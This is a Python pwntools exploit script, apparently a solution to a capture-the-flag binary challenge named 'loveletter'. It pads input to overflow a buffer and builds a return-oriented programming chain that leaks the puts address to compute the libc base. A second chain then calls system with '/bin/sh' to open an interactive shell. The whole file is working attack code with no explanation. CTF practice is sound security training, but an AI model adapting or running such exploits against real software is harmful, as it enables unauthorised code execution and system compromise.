from pwn import *

exe = ELF('./main_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(exe.path)
#p = remote('loveletter.securinets.tn',4040)

p.sendafter(b'> ', b'A'*4000)
p.sendafter(b'> ', b'A'*2969)

p.recvuntil(b'letter?\n')
p.sendafter(b'> ', b'Y')
#input()

pop_rdi = 0x00000000004014b3
pop_rsi = 0x00000000004014b1
leave_ret = 0x0000000000401213
ret = 0x000000000040101a
pop_rbp = 0x00000000004011bd

payload = b'A'*256
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(pop_rdi) + p64(0x404858)
payload += p64(pop_rsi) + p64(0x100) + p64(0x0)
payload += p64(ret)
payload += p64(exe.sym['readInput'])
payload += p64(leave_ret)

p.recvuntil(b'now.\n')
p.sendafter(b'> ', payload)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info("Lib leak: " + hex(libc_leak))

log.info("Lib base: " + hex(libc.address))

# local 0x6c20646f6f47
# sever 0x6c20646f6f47
input()
payload = p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
p.sendafter(b'> ', payload)

p.interactive()